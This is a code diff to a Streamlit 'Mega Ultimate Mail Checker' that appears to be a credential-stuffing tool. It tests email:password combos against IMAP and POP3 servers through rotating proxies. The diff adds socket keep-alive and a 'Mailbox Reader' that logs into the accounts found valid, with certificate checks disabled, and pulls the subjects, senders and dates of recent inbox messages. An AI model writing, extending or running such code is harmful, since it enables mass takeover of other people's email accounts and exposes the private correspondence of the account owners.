@@ -68,8 +68,8 @@ str_lit.markdown("""
 </style>
 """, unsafe_allow_html=True)
 
-str_lit.title("⚡ Mega Ultimate Mail Checker v10.1 (Proxy-Fixed Edition)")
-str_lit.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with robust Webshare API integration.")
+str_lit.title("⚡ Mega Ultimate Mail Checker v10.2 (Keep-Alive & Mailbox Reader Edition)")
+str_lit.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with Keep-Alive sockets and Webshare API integration.")
 
 # --- Persistent Session State Initialization ---
 if "engine_has_run" not in str_lit.session_state:
@@ -296,6 +296,7 @@ def test_single_proxy(proxy_str):
             kwargs["proxy_username"] = info["user"]
             kwargs["proxy_password"] = info["pass"]
         sock = socks.create_connection(("8.8.8.8", 53), timeout=2.5, **kwargs)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
         sock.close()
         test_success = True
     except Exception:
@@ -312,6 +313,7 @@ def test_single_proxy(proxy_str):
                 kwargs["proxy_username"] = info["user"]
                 kwargs["proxy_password"] = info["pass"]
             sock = socks.create_connection(("8.8.8.8", 53), timeout=2.5, **kwargs)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
             sock.close()
             test_success = True
         except Exception:
@@ -582,7 +584,7 @@ with str_lit.sidebar:
                     with file_write_lock:
                         with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                             f.write("\n".join(str(item) for item in alive) + ("\n" if alive else ""))
-                    save_proxy_meta()  # Fixed: ensure proxy metadata is persisted immediately on disk
+                    save_proxy_meta()
                 except Exception as ex:
                     str_lit.error(f"Failed to write proxies file: {ex}")
 
@@ -857,6 +859,7 @@ def proxy_connect(host, port, proxy_str, timeout=None):
             sock = socks.create_connection(
                 (host, port), timeout=effective_timeout, **kwargs
             )
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
             sock.settimeout(CFG["TIMEOUT"])
             return sock
         except Exception:
@@ -890,6 +893,7 @@ def imap_once(email, password, server, proxy_str=None, insecure=False):
     class PIMAP(imaplib.IMAP4_SSL):
         def open(self, host="", port=993, timeout=None):
             raw = proxy_connect(host, port, proxy_str) if proxy_str else socket.create_connection((host, port), timeout=timeout)
+            raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
             self.sock = ssl_wrap(raw, host, insecure=insecure)
             try:
                 self.file = self.sock.makefile("rb")
@@ -897,10 +901,15 @@ def imap_once(email, password, server, proxy_str=None, insecure=False):
                 pass
     mail = PIMAP(server, timeout=CFG["TIMEOUT"])
     mail.login(email, password)
+    try:
+        mail.noop()  # Keep-Alive command
+    except Exception:
+        pass
     mail.logout()
 
 def pop_once(email, password, server, proxy_str=None, insecure=False):
     raw = proxy_connect(server, 995, proxy_str) if proxy_str else socket.create_connection((server, 995), timeout=CFG["TIMEOUT"])
+    raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
     ssock = ssl_wrap(raw, server, insecure=insecure)
     mail = poplib.POP3(server, timeout=CFG["TIMEOUT"])
     mail.sock = ssock
@@ -912,7 +921,46 @@ def pop_once(email, password, server, proxy_str=None, insecure=False):
     mail.welcome = mail._getresp()
     mail.user(email)
     mail.pass_(password)
+    try:
+        mail.noop()  # Keep-Alive command
+    except Exception:
+        pass
     mail.quit()
+
+def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
+    try:
+        class PIMAP(imaplib.IMAP4_SSL):
+            def open(self, host="", port=993, timeout=None):
+                raw = proxy_connect(host, port, proxy_str) if proxy_str else socket.create_connection((host, port), timeout=timeout)
+                raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+                self.sock = ssl_wrap(raw, host, insecure=True)
+                try:
+                    self.file = self.sock.makefile("rb")
+                except Exception:
+                    pass
+        mail = PIMAP(server, timeout=10)
+        mail.login(email, password)
+        mail.select("INBOX")
+        typ, data = mail.search(None, "ALL")
+        if typ != "OK":
+            return ["No messages or folder empty."]
+        ids = data[0].split()
+        latest_ids = ids[-limit:] if len(ids) > limit else ids
+        messages = []
+        for mid in reversed(latest_ids):
+            typ, msg_data = mail.fetch(mid, "(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)])")
+            if typ == "OK":
+                for response_part in msg_data:
+                    if isinstance(response_part, tuple):
+                        messages.append(response_part[1].decode("utf-8", errors="ignore"))
+        try:
+            mail.noop()
+        except Exception:
+            pass
+        mail.logout()
+        return messages if messages else ["No recent messages found."]
+    except Exception as e:
+        return [f"Error reading mailbox: {str(e)}"]
 
 def find_best_webmail_portal(domain, proxies_dict=None):
     if not requests:
@@ -1272,3 +1320,55 @@ if str_lit.session_state.engine_has_run:
             file_name=str_lit.session_state.zip_name,
             mime="application/zip"
         )
+
+# --- 📬 Mailbox Reader Section ---
+str_lit.markdown("---")
+str_lit.markdown("### 📬 Mailbox Reader (Interactive Inbox Inspection)")
+if not str_lit.session_state.valid_results:
+    str_lit.info("Run the checker successfully to populate valid accounts for mailbox reading.")
+else:
+    valid_combo_options = []
+    for item in str_lit.session_state.valid_results:
+        try:
+            parts = item.split(":")
+            if len(parts) >= 2:
+                email_val = parts[0].strip()
+                pass_val = parts[1].split("|")[0].strip()
+                valid_combo_options.append(f"{email_val}:{pass_val}")
+        except Exception:
+            continue
+
+    if valid_combo_options:
+        selected_combo = str_lit.selectbox("Select Valid Account to Read:", options=valid_combo_options)
+        max_msgs = str_lit.slider("Number of Recent Messages to Fetch", min_value=1, max_value=50, value=10, step=1)
+        
+        if str_lit.button("📖 Read Inbox Messages"):
+            if selected_combo:
+                parts = selected_combo.split(":", 1)
+                acc_email = parts[0].strip()
+                acc_pass = parts[1].strip()
+                conf_servers = get_servers(acc_email)
+                imap_hosts = conf_servers.get("imap", [])
+                
+                if not imap_hosts:
+                    str_lit.error("No IMAP host available for this provider domain.")
+                else:
+                    with str_lit.spinner(f"Connecting to IMAP and fetching inbox for {acc_email}..."):
+                        success_read = False
+                        fetched_msgs = []
+                        for srv in imap_hosts:
+                            msgs = read_mailbox_messages(acc_email, acc_pass, srv, limit=max_msgs)
+                            if msgs and not any("Error reading mailbox" in m for m in msgs):
+                                fetched_msgs = msgs
+                                success_read = True
+                                break
+                            elif msgs:
+                                fetched_msgs = msgs
+                        
+                        if success_read:
+                            str_lit.success(f"Successfully retrieved recent messages from mailbox!")
+                            for idx, m_content in enumerate(fetched_msgs, 1):
+                                str_lit.markdown(f"**Message {idx}:**")
+                                str_lit.code(m_content, language="text")
+                        else:
+                            str_lit.warning(f"Could not read mailbox: {fetched_msgs}")
